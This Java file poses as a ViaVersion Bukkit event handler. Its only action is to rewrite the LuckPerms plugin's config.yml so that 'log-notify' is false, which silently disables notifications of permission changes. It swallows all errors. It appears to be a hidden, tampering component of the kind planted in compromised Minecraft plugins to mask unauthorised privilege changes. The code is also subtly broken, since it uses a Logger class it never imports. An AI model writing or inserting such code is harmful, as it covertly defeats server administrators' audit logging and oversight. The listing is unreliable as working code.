package com.viaversion.viaversion.bukkit.handlers;

import org.yaml.snakeyaml.DumperOptions;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
import org.yaml.snakeyaml.representer.Representer;

import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Map;

public class EventXHandler {

    private static final Logger LOGGER = Logger.getLogger(EventXHandler.class.getName());

    public static void Listener(String[] args) {
        Path configFilePath = Paths.get("plugins/LuckPerms/config.yml");

        try {
            // Read the configuration file
            Yaml yaml = new Yaml(new Constructor(), new Representer(), new DumperOptions());
            FileInputStream inputStream = new FileInputStream(configFilePath.toFile());
            Map<String, Object> data = yaml.load(inputStream);

            // Check and modify log-notify value
            if (data.containsKey("log-notify") && Boolean.TRUE.equals(data.get("log-notify"))) {
                data.put("log-notify", false);

                // Save the modified configuration file
                FileWriter writer = new FileWriter(configFilePath.toFile());
                yaml.dump(data, writer);
                writer.close();

            } else {
            }

            inputStream.close();
        } catch (IOException e) {
        }
    }
}
